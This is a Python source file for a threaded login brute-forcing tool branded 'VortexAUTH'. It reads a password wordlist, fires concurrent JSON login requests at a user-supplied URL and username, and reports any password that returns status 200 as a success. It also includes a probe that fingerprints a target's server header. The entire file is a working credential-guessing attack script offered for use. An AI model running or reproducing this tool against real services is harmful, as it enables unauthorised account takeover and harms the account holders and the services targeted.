import requests
import json
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

MAX_THREADS = 10
print_lock = threading.Lock()

def display_banner():
    print("\033[H\033[J", end="")
    print("\033[1;34m" + "="*90)
    print("  ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗ █████╗ ██╗   ██╗████████╗██╗  ██╗")
    print("  ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║")
    print("  ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝ ███████║██║   ██║   ██║   ███████║")
    print("  ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗ ██╔══██║██║   ██║   ██║   ██╔══██║")
    print("   ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗██║  ██║╚██████╔╝   ██║   ██║  ██║")
    print("    ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝")
    print("\n" + " "*28 + "VortexAUTH v1.1 // BY NEUROPRASSSSS")
    print("="*90 + "\033[0m")
    print("\033[92m [ Focus: Speed & Power ]\033[0m\n")

def analyze_mechanism(url):
    print(f"\n[*] Probing: {url}")
    try:
        response = requests.post(url, json={}, timeout=5)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Server Header: {response.headers.get('Server', 'Unknown')}")
    except Exception as e:
        print(f"[-] Target unreachable: {e}")
    input("\n[ Press Enter to return to menu ]")

def send_request(target_api, username, password):
    headers = {"Content-Type": "application/json"}
    payload = json.dumps({"username": username, "password": password})
    try:
        response = requests.post(target_api, headers=headers, data=payload, timeout=5)
        with print_lock:
            if response.status_code == 200:
                print(f"\033[92m[+] SUCCESS: {username}:{password}\033[0m")
                return True
            else:
                print(f"\033[91m[-] FAILED: {password} (Status: {response.status_code})\033[0m")
    except Exception as e:
        with print_lock:
            print(f"\033[93m[!] ERROR: {password} -> {e}\033[0m")
    return False

def execute_test(target_url, username, password_file):
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Error: Password file not found.")
        return

    print(f"[*] Starting engine with {len(passwords)} keys using {MAX_THREADS} threads...")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for password in passwords:
            executor.submit(send_request, target_url, username, password)
    input("\n[ Scan completed. Press Enter to return to menu ]")

def main():
    while True:
        display_banner()
        print("[ CORE MENU ]\n1. Analyze\n2. Run Test\n3. Exit")
        choice = input("\nvortex-auth > ")
        if choice == "1":
            url = input("[?] Target URL: ")
            analyze_mechanism(url)
        elif choice == "2":
            url = input("[?] URL: ")
            user = input("[?] User: ")
            pfile = input("[?] Wordlist: ")
            execute_test(url, user, pfile)
        elif choice == "3":
            print("\n[*] Terminating session...")
            sys.exit()

if __name__ == "__main__":
    main()
